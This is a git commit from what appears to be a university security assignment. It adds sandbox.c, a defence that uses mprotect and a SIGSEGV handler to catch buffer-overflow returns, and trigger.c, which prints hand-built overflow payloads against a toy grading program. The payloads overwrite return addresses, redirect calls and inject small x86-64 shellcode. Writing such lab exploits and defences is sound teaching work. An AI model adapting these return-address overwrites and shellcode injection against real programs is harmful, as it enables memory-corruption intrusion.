a78cd57b56911ce07882fefba5b37256c8435d9e
Arpit Tyagi <neo.arpit@gmail.com>
2016-03-21 23:10:14 -0400

    first commit

---
+++ sandbox.c
@@ -0,0 +1,103 @@
+/*
+ * sandbox.c
+ *
+ * Single Author info:
+ * atyagi2 Arpit Tyagi
+ * Group info:
+ * atyagi2 Arpit Tyagi
+ * rpatel16 Ravi Ashok Kumar Patel
+ * bjiang6 Bowen Jiang
+ */
+
+#include <malloc.h>
+#include <stdio.h>
+#include <ucontext.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+
+extern void readString(char *s, int r); 
+extern void main(int argc, char *argv[]);
+
+void protectHandler(int signo, siginfo_t* siginfo, void* unused);
+
+long (* addressOfReadString)(char *, int );
+long (* addressOfMain)(int , char *);
+long mainReturnAddress;
+
+/*
+ * initilize sandbox
+ * Store addressed in global variables
+ * Install signal handler for SIGSEGV
+ */
+void init_sandbox()
+{
+	int pageSize = 1;
+	/*Store address of readString and main`*/
+	addressOfReadString = (void*) readString;
+	addressOfMain = (void*) main;
+	
+	/*Remove execute permission from readString*/
+	mprotect((void*)((long)addressOfReadString & 0xfffffffffffff000), pageSize, PROT_READ);
+	mprotect((void*)((long)addressOfMain & 0xfffffffffffff000), pageSize, PROT_READ | PROT_EXEC);
+	
+	/*Install SignalHandler*/
+	struct sigaction new_sa;
+	memset(&new_sa, 0, sizeof(new_sa));
+	new_sa.sa_sigaction = protectHandler;
+	new_sa.sa_flags = 0;
+	new_sa.sa_flags = new_sa.sa_flags | SA_SIGINFO | SA_RESTART;
+	sigemptyset(&new_sa.sa_mask);
+	sigaddset(&new_sa.sa_mask, SIGSEGV);
+	
+	sigaction(SIGSEGV, &new_sa, NULL);
+	
+	sigset_t new_mask;
+	sigemptyset(&new_mask);
+	sigaddset(&new_mask, SIGSEGV);
+	
+	sigprocmask(SIG_UNBLOCK, &new_mask, NULL);
+}
+/*Signal handler for SIGSEGV*/
+void protectHandler(int signo, siginfo_t* siginfo, void* contextInfo)
+{
+	int pageSize = 1;
+	void* segmentFaultAddress;
+	ucontext_t *context;
+	
+	segmentFaultAddress = siginfo->si_addr;
+	context = (ucontext_t *) contextInfo;
+	/*If readString is called*/
+	if( ((long)addressOfReadString) == ((long)segmentFaultAddress))
+	{
+		/*Return address of readString, stored in global variable*/
+		mainReturnAddress = *(int *)context->uc_mcontext.gregs[15];
+		/*Give execute permission to readString, remove execute permission from main*/
+		mprotect((void*)((long)addressOfReadString & 0xfffffffffffff000), pageSize, PROT_EXEC | PROT_READ);
+		mprotect((void*)((long)addressOfMain & 0xfffffffffffff000), pageSize, PROT_READ);
+	}
+	/*If readString returned to main*/
+	else if( ((long)addressOfMain & 0xfffffffffffff000) == ((long)segmentFaultAddress & 0xfffffffffffff000) )
+	{
+		/*If returned at correct address*/
+		if(((long)mainReturnAddress) == ((long)segmentFaultAddress))
+		{
+			/*Give execute permission to main, remove execute permission from readString*/
+			mprotect((void*)((long)addressOfMain & 0xfffffffffffff000), pageSize, PROT_EXEC | PROT_READ);
+			mprotect((void*)((long)addressOfReadString & 0xfffffffffffff000), pageSize, PROT_READ);
+		}
+		/*returned at incorrect address in main*/
+		else
+		{
+			printf("malicious buffer overflow detected, will exit!\n");
+			exit(0);
+		}
+	}
+	/*Returned to somewhere else, other than main*/
+	else{
+		printf("malicious buffer overflow detected, will exit!\n");
+		exit(0);
+	}
+}
---
+++ trigger.c
@@ -0,0 +1,671 @@
+/*
+ * trigger.c
+ *
+ * Single Author info:
+ * atyagi2 Arpit Tyagi
+ * Group info:
+ * atyagi2 Arpit Tyagi
+ * rpatel16 Ravi Ashok Kumar Patel
+ * bjiang6 Bowen Jiang
+ */
+
+#include <stdio.h>
+
+int main(int argc, char *argv[]) {
+	/* Attack e - Segmentation fault - Just flood the buffer with data, adds a \0 in between */
+	if (argc > 1 && argv[1][0] == 'e')
+	{
+		int i = 0, max = 145;
+		for(i = 0;i<max;i++){
+			if(i==10)
+				putc(0,stdout);
+			else
+				putc(65+i%26,stdout);
+		}
+	}
+	/*Attack d - call setGradeToD function instead of checkName*/
+	else if (argc > 1 && argv[1][0] == 'd')
+	{
+		putc(0x41,stdout);
+		putc(0x52,stdout);
+		putc(0x50,stdout);
+		putc(0x49,stdout);
+		putc(0x54,stdout);
+		putc(0x00,stdout);
+		/*Name ends here, following is some garbage data*/
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xa0,stdout);
+		putc(0xe7,stdout);
+		putc(0x58,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x12,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xd0,stdout);
+		putc(0xe2,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0x7f,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xdf,stdout);
+		putc(0x23,stdout);
+		putc(0x27,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xa0,stdout);
+		putc(0xe7,stdout);
+		putc(0x58,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		/*Overwrite address of checkNames with setGradeToD*/
+		putc(0xb8,stdout);
+		putc(0x07,stdout);
+		putc(0x40,stdout);	
+	}
+	/*Attack c - change return address to a point in main where grade is set to C*/
+	else if (argc > 1 && argv[1][0] == 'c'){
+		putc(0x41,stdout);
+		putc(0x52,stdout);
+		putc(0x50,stdout);
+		putc(0x49,stdout);
+		putc(0x54,stdout);
+		putc(0x00,stdout);
+		/*Name ends here, following is some garbage data*/
+		putc(0x00,stdout);
+		putc(0x43,stdout);
+		putc(0x43,stdout);
+		putc(0x30,stdout);
+		putc(0x27,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xa0,stdout);
+		putc(0xe7,stdout);
+		putc(0x58,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x12,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xd0,stdout);
+		putc(0xe2,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0x7f,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xdf,stdout);
+		putc(0x23,stdout);
+		putc(0x27,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xa0,stdout);
+		putc(0xe7,stdout);
+		putc(0x58,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x59,stdout);
+		putc(0x08,stdout);
+		putc(0x40,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x12,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x10,stdout);
+		putc(0x06,stdout);
+		putc(0x40,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xd0,stdout);
+		putc(0xe2,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0x7f,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xd8,stdout);
+		putc(0xe2,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0x7f,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		/*Return address of readString changed to a new Return address*/
+		putc(0x1e,stdout);
+		putc(0x08,stdout);
+		putc(0x40,stdout);
+	}
+	/*Attack b - Set some code in buffer to get Grade B*/
+	else if (argc > 1 && argv[1][0] == 'b'){
+		putc(0x41,stdout);//1
+		putc(0x52,stdout);
+		putc(0x50,stdout);
+		putc(0x49,stdout);
+		putc(0x54,stdout);
+		putc(0x00,stdout);//6
+		
+		putc(0x49,stdout);//7 Code Starts Here - mov $0x42, %r10
+		putc(0xc7,stdout);
+		putc(0xc2,stdout);
+		putc(0x42,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+
+		putc(0x4c,stdout);	//mov %r10, 0x600d84
+		putc(0x89,stdout);
+		putc(0x14,stdout);
+		putc(0x25,stdout);
+		putc(0x84,stdout);
+		putc(0x0d,stdout);
+		putc(0x60,stdout);
+		putc(0x00,stdout);
+
+		putc(0x49,stdout); //mov $0x400803, %r10
+		putc(0xc7,stdout);
+		putc(0xc2,stdout);
+		putc(0x03,stdout);
+		putc(0x08,stdout);
+		putc(0x40,stdout);
+		putc(0x00,stdout);
+
+		putc(0x41,stdout); // jmp *%r10
+		putc(0xff,stdout);
+		putc(0xe2,stdout);
+
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);//36 End of Name
+		
+		/* Garbage data follows */
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x12,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xc0,stdout);
+		putc(0xe1,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0x7f,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xdf,stdout);
+		putc(0x23,stdout);
+		putc(0x27,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xa0,stdout);
+		putc(0xe7,stdout);
+		putc(0x58,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x59,stdout);
+		putc(0x08,stdout);
+		putc(0x40,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x12,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x10,stdout);
+		putc(0x06,stdout);
+		putc(0x40,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xc0,stdout);
+		putc(0xe1,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0x7f,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xc8,stdout);
+		putc(0xe1,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0x7f,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		
+		/*Change Return Address to Name+6 */
+		putc(0xc6,stdout);
+		putc(0x0d,stdout);
+		putc(0x60,stdout);						
+	}
+	/*Attack a - Get grade A, similar to Attck B, add return address to multiple places*/
+	else if (argc > 1 && argv[1][0] == 'a'){
+		putc(0x41,stdout);//1
+		putc(0x52,stdout);
+		putc(0x50,stdout);
+		putc(0x49,stdout);
+		putc(0x54,stdout);
+		putc(0x00,stdout);//6
+
+		putc(0x49,stdout);//7 Code Starts Here - mov $0x41, %r10
+		putc(0xc7,stdout);
+		putc(0xc2,stdout);
+		putc(0x41,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+
+		putc(0x4c,stdout);	//mov %r10, 0x600d84
+		putc(0x89,stdout);
+		putc(0x14,stdout);
+		putc(0x25,stdout);
+		putc(0x84,stdout);
+		putc(0x0d,stdout);
+		putc(0x60,stdout);
+		putc(0x00,stdout);
+
+		putc(0x49,stdout); //mov $0x400803, %r10
+		putc(0xc7,stdout);
+		putc(0xc2,stdout);
+		putc(0x03,stdout);
+		putc(0x08,stdout);
+		putc(0x40,stdout);
+		putc(0x00,stdout);
+
+		putc(0x41,stdout); // jmp *%r10
+		putc(0xff,stdout);
+		putc(0xe2,stdout);
+
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);//36 Thats it
+
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x12,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xc0,stdout);
+		putc(0xe1,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0x7f,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xdf,stdout);
+		putc(0x23,stdout);
+		putc(0x27,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xa0,stdout);
+		putc(0xe7,stdout);
+		putc(0x58,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+
+		putc(0xc6,stdout);//Return Address to Name+6
+		putc(0x0d,stdout);
+		putc(0x60,stdout);						
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+
+		putc(0xc6,stdout);//Return Address to Name+6
+		putc(0x0d,stdout);
+		putc(0x60,stdout);						
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+
+		putc(0xc6,stdout);//Return Address to Name+6
+		putc(0x0d,stdout);
+		putc(0x60,stdout);						
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+
+		putc(0xc6,stdout);//Return Address to Name+6
+		putc(0x0d,stdout);
+		putc(0x60,stdout);						
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+
+		putc(0xc6,stdout);//Return Address to Name+6
+		putc(0x0d,stdout);
+		putc(0x60,stdout);						
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+	
+		putc(0xc6,stdout);//Return Address to Name+6
+		putc(0x0d,stdout);
+		putc(0x60,stdout);						
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+
+		putc(0xc6,stdout);//Return Address to Name+6
+		putc(0x0d,stdout);
+		putc(0x60,stdout);						
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+
+		putc(0xc6,stdout);//Return Address to Name+6
+		putc(0x0d,stdout);
+		putc(0x60,stdout);						
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+
+		putc(0xc6,stdout);//Return Address to Name+6
+		putc(0x0d,stdout);
+		putc(0x60,stdout);						
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+
+		putc(0xc6,stdout);//Return Address to Name+6
+		putc(0x0d,stdout);
+		putc(0x60,stdout);						
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+
+
+		putc(0xc6,stdout);//Return Address to Name+6
+		putc(0x0d,stdout);
+		putc(0x60,stdout);						
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+	}
+	/*Attack s - changes return address of readString*/
+	else if (argc > 1 && argv[1][0] == 's'){
+		putc(0x41,stdout);
+		putc(0x52,stdout);
+		putc(0x50,stdout);
+		putc(0x49,stdout);
+		putc(0x54,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x43,stdout);
+		putc(0x43,stdout);
+		putc(0x30,stdout);
+		putc(0x27,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xa0,stdout);
+		putc(0xe7,stdout);
+		putc(0x58,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x12,stdout);
+		putc(0xd0,stdout);
+		putc(0xe2,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0x7f,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xdf,stdout);
+		putc(0x23,stdout);
+		putc(0x27,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xa0,stdout);
+		putc(0xe7,stdout);
+		putc(0x58,stdout);
+		putc(0xcf,stdout);
+		putc(0x32,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x59,stdout);
+		putc(0x08,stdout);
+		putc(0x40,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x12,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x10,stdout);
+		putc(0x06,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xd0,stdout);
+		putc(0xe2,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0x7f,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0xd8,stdout);
+		putc(0xe2,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0xff,stdout);
+		putc(0x7f,stdout);
+		putc(0x00,stdout);
+		putc(0x00,stdout);
+		putc(0x73,stdout);
+		putc(0x29,stdout);
+		putc(0x40,stdout);
+	}
+	else
+	{
+		putc(0x41,stdout);
+		putc(0x52,stdout);
+		putc(0x50,stdout);
+		putc(0x49,stdout);
+		putc(0x54,stdout);
+		putc(0x00,stdout);
+		
+	}
+}
